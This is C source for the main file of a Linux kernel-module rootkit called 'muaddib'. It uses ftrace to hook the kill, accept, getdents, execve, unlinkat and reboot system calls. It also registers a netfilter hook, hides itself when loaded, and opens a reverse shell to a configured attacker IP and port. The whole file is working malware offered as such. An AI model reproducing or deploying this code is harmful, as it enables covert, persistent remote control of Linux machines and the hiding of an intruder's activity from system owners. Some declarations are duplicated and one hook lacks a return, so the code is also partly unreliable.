//https://xcellerator.github.io/posts/linux_rootkits_11/
//https://github.com/m0nad/Diamorphine
//https://github.com/h3xduck/Umbra
//https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
#include "ftrace_hook.h"
#include "mkdir_hook.c"
#include "kill_hook.c"
#include "accept_hook.c"
#include "getdents_hook.c"
#include "execve_hook.c"
#include "unlinkat_hook.c"
#include "netfilter_hook.c"

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*og_reboot)(const struct pt_regs *);
asmlinkage int muaddib_reboot(const struct pt_regs *regs);
#else
static asmlinkage long (*og_reboot) (int magic, int magic2, int cmd, void *arg);
asmlinkage int muaddib_reboot(int magic, int magic2, int cmd, void *arg);
#endif


static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", muaddib_kill, &og_kill),
    HOOK("sys_accept", muaddib_accept, &og_accept),
	HOOK("sys_getdents64", muaddib_getdents64, &og_getdents64),
	HOOK("sys_getdents", muaddib_getdents, &og_getdents),
	HOOK("sys_execve", muaddib_execve, &og_execve),
	HOOK("sys_unlinkat", muaddib_unlinkat, &og_unlinkat),
	HOOK("sys_reboot", muaddib_reboot, &og_reboot),
};

static int __init muaddib_init(void){
	#if DEBUGMSG == 1
	printk(KERN_INFO "Loading... :)");
	#endif
	int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err){ return err; }
	reg_nf_hook();
	hideme(); //hide on load
	hidden = 1;
	start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    return 0;
}

static void __exit muaddib_cleanup(void){
    /* Unhook and restore the syscall and print to the kernel buffer */
	showme();
	hidden = 0;
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	unreg_nf_hook();
	#if DEBUGMSG == 1
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
	#endif
}

#ifdef PTREGS_SYSCALL_STUBS

static asmlinkage long (*og_reboot)(const struct pt_regs *);

asmlinkage int muaddib_reboot(const struct pt_regs *regs){
    muaddib_cleanup();
    return og_reboot(regs);
}
#else
static asmlinkage long (*og_reboot) (int magic, int magic2, int cmd, void *arg);
asmlinkage int muaddib_reboot(int magic, int magic2, int cmd, void *arg){
	muaddib_cleanup();
	og_reboot(magic, magic2, cmd, arg);
}
#endif

module_init(muaddib_init);
module_exit(muaddib_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nerelod");
MODULE_DESCRIPTION("LKM rootkit");
